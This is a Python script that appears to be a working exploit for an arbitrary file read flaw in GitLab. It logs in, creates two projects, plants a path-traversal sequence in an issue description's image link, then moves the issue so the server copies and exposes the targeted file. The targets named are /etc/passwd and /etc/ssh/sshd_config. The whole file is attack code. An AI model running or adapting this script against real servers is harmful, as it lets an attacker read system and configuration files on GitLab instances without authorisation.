import requests
import json

proxies = {
    'http' : '127.0.0.1:8080',
    'https' : '127.0.0.1:8080'
}
session = requests.Session()
host = 'gitlab server address'
username = 'username'
password = 'password'
lastIssueUrl = ""

def loginToGitLab(username, password):

    initLoginUrl = '{}/users/sign_in'.format(host)

    initLoginResult = session.get(initLoginUrl, proxies = proxies).text

    temp_index_csrf_param_start = initLoginResult.find("csrf-param")
    temp_index_csrf_param_end = initLoginResult.find("/>", temp_index_csrf_param_start)
    csrf_param = initLoginResult[temp_index_csrf_param_start + 21 : temp_index_csrf_param_end - 2]

    temp_index_csrf_token_start = initLoginResult.find("csrf-token")
    temp_index_csrf_token_end = initLoginResult.find("/>", temp_index_csrf_token_start)
    csrf_token = initLoginResult[temp_index_csrf_token_start + 21 : temp_index_csrf_token_end - 2]

    #print("Took csrf toke ----> " + csrf_param + " : " + csrf_token + "\n")

    submitLoginUrl = '{}/users/auth/ldapmain/callback'.format(host)

    submitLoginData = {
        'utf8=' : '✓',
        csrf_param : csrf_token,
        'username' : username,
        'password' : password,
    }

    submitLoginResult = session.post(submitLoginUrl, submitLoginData, proxies = proxies, allow_redirects=False)
    
    if submitLoginResult.status_code == 302 and submitLoginResult.text.find('redirected') > -1:
        print("You'e logged in ...")
        #print("***************************************************************************\n")


def createNewProject(projectName):


    initProjectUrl = '{}/projects/new'.format(host)

    initProjectResult = session.get(initProjectUrl, proxies = proxies).text

    temp_index_csrf_param_start = initProjectResult.find("csrf-param")
    temp_index_csrf_param_end = initProjectResult.find("/>", temp_index_csrf_param_start)
    csrf_param = initProjectResult[temp_index_csrf_param_start + 21 : temp_index_csrf_param_end - 2]

    temp_index_csrf_token_start = initProjectResult.find("csrf-token")
    temp_index_csrf_token_end = initProjectResult.find("/>", temp_index_csrf_token_start)
    csrf_token = initProjectResult[temp_index_csrf_token_start + 21 : temp_index_csrf_token_end - 2]

    #print("Took csrf toke ----> " + csrf_param + " : " + csrf_token + "\n")

    createProjectUrl = '{}/projects'.format(host)
    createProjectData = {
        'utf8=' : '✓',
        csrf_param : csrf_token,
        'project[ci_cd_only]' : 'false',
        'project[name]' : projectName,
        'project[namespace_id]' : '8',
        'project[path]' : projectName,
        'project[description]' : '',
        'project[visibility_level]' : '0'
    }

    createProjectResult = session.post(createProjectUrl, createProjectData, proxies = proxies, allow_redirects=False)
    
    if createProjectResult.status_code == 302:

        print("New Project {} created ...".format(projectName))
        #print("***************************************************************************\n")

def createNewIssue(projectName, issueTitle, file):

    global lastIssueUrl

    initIssueUrl = '{}/{}/{}/-/issues/new'.format(host, username, projectName)

    initIssueResult = session.get(initIssueUrl, proxies = proxies).text

    temp_index_csrf_param_start = initIssueResult.find("csrf-param")
    temp_index_csrf_param_end = initIssueResult.find("/>", temp_index_csrf_param_start)
    csrf_param = initIssueResult[temp_index_csrf_param_start + 21 : temp_index_csrf_param_end - 2]

    temp_index_csrf_token_start = initIssueResult.find("csrf-token")
    temp_index_csrf_token_end = initIssueResult.find("/>", temp_index_csrf_token_start)
    csrf_token = initIssueResult[temp_index_csrf_token_start + 21 : temp_index_csrf_token_end - 2]

    #print("Took csrf toke ----> " + csrf_param + " : " + csrf_token + "\n")

    createIssueUrl = '{}/{}/{}/-/issues'.format(host , username, projectName)

    createIssueData = {
        'utf8=' : '✓',
        csrf_param : csrf_token,
        'issue[title]' : issueTitle,
        'issue[description]' : '![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../..{})'.format(file),
        'issue[confidential]' : '0',
        'issue[assignee_ids][]' : '0',
        'issue[label_ids][]' : '',
        'issue[due_date]' : '',
        'issue[lock_version]' : '0'
    }

    createIssueResult = session.post(createIssueUrl, createIssueData, proxies = proxies, allow_redirects=False)

    if createIssueResult.status_code == 302:

        print("New issue for {} created ...\n".format(projectName))
        tmp_index_1 = createIssueResult.text.find("href")
        tmp_index_2 = createIssueResult.text.find("redirected")
        lastIssueUrl = createIssueResult.text[tmp_index_1 + 6: tmp_index_2 - 2]
        print(lastIssueUrl)
        print("***************************************************************************")

def moveLastIssue(source, destination):

    # Get destination project ID

    getProjectIdUrl = '{}/{}/{}'.format(host, username, destination)
    getProjectIdResult = session.get(getProjectIdUrl).text

    tmpIndex = getProjectIdResult.find('/search?project_id')
    projectId = getProjectIdResult[tmpIndex + 19 : tmpIndex + 21]
    #print("Project : {} ID ----> {}\n".format(destination, projectId))


#############################################

    # Get CSRF token for moving issue
    # initIssueMoveUrl = '{}/{}/{}/-/issues/{}'.format(host, username, source, issue)
    initIssueMoveUrl = lastIssueUrl

    initIssueMoveResult = session.get(initIssueMoveUrl, proxies = proxies).text

    temp_index_csrf_token_start = initIssueMoveResult.find("csrf-token")
    temp_index_csrf_token_end = initIssueMoveResult.find("/>", temp_index_csrf_token_start)
    csrf_token = initIssueMoveResult[temp_index_csrf_token_start + 21 : temp_index_csrf_token_end - 2]

    #print("Took csrf toke ----> " + csrf_param + " : " + csrf_token + "\n")

    # Move issue with associated CSRF token
    #moveIssueUrl = "{}/{}/{}/-/issues/{}/move".format(host, username, source, issue)
    moveIssueUrl = lastIssueUrl + "/move"
    moveIssueData = json.dumps({
        "move_to_project_id" : int(projectId)
    })
    headers = {
        'X-CSRF-Token' : csrf_token,
        'X-Requested-With' : 'XMLHttpRequest',
        'Content-Type' : 'application/json;charset=utf-8'
    }
    moveIssueResult = session.post(moveIssueUrl, headers = headers, data = moveIssueData, proxies = proxies, allow_redirects = False)

    description = json.loads(moveIssueResult.text)["description"]
    tmp_index = description.find("/")
    fileUrl = "{}/{}/{}/{}".format(host, username, destination, description[tmp_index+1:-1])

    print(fileUrl)
    print(session.get(fileUrl).text)



if __name__ == "__main__":

    loginToGitLab(username, password)

    createNewProject("pro_1")
    createNewProject("pro_2")

    # Put the files you want to read from server here
    files = {
        '/etc/passwd',
        '/etc/ssh/sshd_config'
    } # The files on server should have **4 or more permission (world readable files)

    
    for f in files:
        createNewIssue("pro_1", "issue_{}".format(f), f)
        moveLastIssue("pro_1", "pro_2",)
